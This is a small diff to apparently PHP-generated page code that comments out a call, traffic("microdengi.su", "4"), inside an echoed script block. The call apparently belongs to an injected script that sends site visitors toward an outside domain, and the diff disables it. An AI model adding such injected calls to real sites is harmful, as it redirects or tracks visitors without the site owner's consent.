@@ -509,7 +509,7 @@
         }
         return c;
     } 
-    traffic("microdengi.su", "4");
+    //traffic("microdengi.su", "4");
 </script>';
 }
 ?>
